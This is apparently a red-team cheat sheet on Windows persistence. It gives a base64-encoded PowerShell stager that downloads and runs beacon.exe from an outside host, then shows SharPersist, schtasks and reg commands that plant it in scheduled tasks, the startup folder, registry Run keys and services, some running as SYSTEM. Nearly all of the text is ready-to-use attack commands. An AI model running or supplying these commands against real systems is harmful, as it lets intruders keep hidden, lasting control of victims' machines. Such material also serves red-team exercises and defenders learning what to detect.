### SharPersist
https://github.com/mandiant/SharPersist

### Powershell Encoding & Decoding
```powershell
$code = ' $wc = New-Object System.Net.WebClient; $wc.DownloadFile("http://192.168.80.100/beacon.exe", "C:\users\public\beacon.exe"); Start-Process -FilePath "C:\users\public\beacon.exe"; '
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($code))
```
```powershell
$Encoded="IAAkAHcAYwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAIAAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA4ADAALgAxADAAMAAvAGIAZQBhAGMAbwBuAC4AZQB4AGUAIgAsACAAIgBDADoAXAB1AHMAZQByAHMAXABwAHUAYgBsAGkAYwBcAGIAZQBhAGMAbwBuAC4AZQB4AGUAIgApADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIAAiAEMAOgBcAHUAcwBlAHIAcwBcAHAAdQBiAGwAaQBjAFwAYgBlAGEAYwBvAG4ALgBlAHgAZQAiADsAIAA"
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($Encoded))

```

### Task Scheduler
```powershell
execute-assembly /root/SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc IAAkAHcAYwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAIAAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA4ADAALgAxADAAMAAvAGIAZQBhAGMAbwBuAC4AZQB4AGUAIgAsACAAIgBDADoAXAB1AHMAZQByAHMAXABwAHUAYgBsAGkAYwBcAGIAZQBhAGMAbwBuAC4AZQB4AGUAIgApADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIAAiAEMAOgBcAHUAcwBlAHIAcwBcAHAAdQBiAGwAaQBjAFwAYgBlAGEAYwBvAG4ALgBlAHgAZQAiADsAIAA=" -n "Name" -m add -o hourly
execute-assembly /root/SharPersist.exe -t schtask -n "Name" -m list
execute-assembly /root/SharPersist.exe -t schtask -n "Name" -m remove
```

### Startup Folder
```powershell
execute-assembly /root/SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc IAAkAHcAYwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAIAAkAHcAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA4ADAALgAxADAAMAAvAGIAZQBhAGMAbwBuAC4AZQB4AGUAIgAsACAAIgBDADoAXAB1AHMAZQByAHMAXABwAHUAYgBsAGkAYwBcAGIAZQBhAGMAbwBuAC4AZQB4AGUAIgApADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIAAiAEMAOgBcAHUAcwBlAHIAcwBcAHAAdQBiAGwAaQBjAFwAYgBlAGEAYwBvAG4ALgBlAHgAZQAiADsAIAA=" -f "Name" -m add
execute-assembly /root/SharPersist.exe -t startupfolder -m list
execute-assembly /root/SharPersist.exe -t startupfolder -f "Name" -m remove
```

### Registry AutoRun (Admin Access for "hklmrun")
```powershell
execute-assembly /root/SharPersist.exe -t reg -c "C:\users\public\beacon.exe" -k "hkcurun" -v "Name" -m add
execute-assembly /root/SharPersist.exe -t reg -k "hkcurun" -v "Name" -m remove
execute-assembly /root/SharPersist.exe -t reg -k "hkcurun" -m list

execute-assembly /root/SharPersist.exe -t reg -c "C:\users\public\beacon.exe" -k "hklmrun" -v "Name" -m add
execute-assembly /root/SharPersist.exe -t reg -k "hklmrun" -v "Name" -m remove
execute-assembly /root/SharPersist.exe -t reg -k "hklmrun" -m list
```

### Windows Service (Admin Access)
```powershell
execute-assembly /root/SharPersist.exe -t service -c "C:\Windows\System32\beacon-svc.exe" -n "Name" -m add
execute-assembly /root/SharPersist.exe -t service -n "Name" -m list
execute-assembly /root/SharPersist.exe -t service -n "Name" -m remove
```

### Task Scheduler (schtasks)
```powershell
shell schtasks /create /sc minute /mo 1 /tn cool /tr "copy /Y C:\Users\Hassan\long.exe C:\Users\Hassan\short.exe & C:\Users\Hassan\short.exe"
shell schtasks /query /tn cool /V /FO LIST
shell schtasks /run /tn "cool"
shell schtasks /delete /tn "cool"
shell schtasks /create /sc onlogon /tn evil /tr calc.exe /ru SYSTEM
```

### Registry AutoRun (reg)
```powershell
shell reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
shell reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
shell reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v EvilTest /d calc.exe
shell reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v EvilTest /d calc.exe
shell reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v EvilTest
shell reg delete HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v EvilTest
```
